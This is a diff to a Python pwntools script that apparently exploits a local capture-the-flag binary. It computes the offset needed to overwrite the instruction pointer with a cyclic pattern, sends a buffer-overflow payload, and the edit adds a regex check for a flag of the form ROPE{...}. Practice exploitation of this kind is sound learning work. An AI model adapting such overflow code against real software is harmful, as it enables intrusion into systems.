@@ -10,6 +10,7 @@
 #   - Pwntools (https://github.com/Gallopsled/pwntools)
 
 import os           # Provides a way of using operating system dependent functionalities
+import re           # Allows pattern matching and text processing through regex
 from pwn import *   # Import Python3 library for accessing operating system functionality
 
 def exploit(binary_path):
@@ -29,7 +30,7 @@ def exploit(binary_path):
 
         # Get the offset by calling the find_offset function
         offset = find_offset(binary_path)
-        log.debug(f"The offset calculated to overwrite RIP is {offset} bytes")
+        log.debug(f"The offset calculated to overwrite EIP is {offset} bytes")
 
         # Construct the payload
         payload = b'i' * offset
@@ -38,7 +39,19 @@ def exploit(binary_path):
         
         # Send the payload and print the output
         io.sendline(payload)
-        log.info(io.clean())
+        output = io.clean().decode()
+        log.info(output)
+
+        # Use regular expression to search for the flag pattern
+        flag_pattern = r'ROPE{[^}]+}'
+        match = re.search(flag_pattern, output)
+
+        # Verify if the ROP exploit was successful in capturing the flag 
+        if match:
+            flag = match.group(0)
+            log.success(f"(SUCESS) The flag {flag} has been successfully captured!")
+        else:
+            log.failure("(FAILURE) You failed to capture the flag. Try a new payload!")
 
 def find_offset(binary_path):
 
@@ -50,26 +63,26 @@ def find_offset(binary_path):
 
     # Create an ELF object and start a new process
     elf = context.binary = ELF(binary_path)
-    io = process(elf.path)
+    
+    # Automatically close the process when the "with" block is exited
+    with process(elf.path) as io:
 
-    # Send a cyclic pattern as input to the binary
-    pattern = cyclic(69)
-    io.sendline(pattern)
-    io.wait()           
+        # Send a cyclic pattern as input to the binary
+        pattern = cyclic(69)
+        io.sendline(pattern)
+        io.wait()           
 
-    # Get the corefile to extract the value of the instruction pointer (eip)
-    core = io.corefile
-    eip = core.eip
+        # Get the corefile to extract the value of the instruction pointer (eip)
+        core = io.corefile
+        eip = core.eip
 
-    # Find the offset by searching for the cyclic pattern in the eip value
-    offset = cyclic_find(p32(eip), n=4)
+        # Find the offset by searching for the cyclic pattern in the eip value
+        offset = cyclic_find(p32(eip), n=4)
 
-    # Close the process that calculated the offset
-    io.close()
+        # Revert the log level to the original value
+        context.log_level = log_level
 
-    # Revert the log level to the original value
-    context.log_level = log_level
-
+    # Return the calculated offset to overwrite the instruction pointer
     return offset
 
 if __name__ == '__main__':
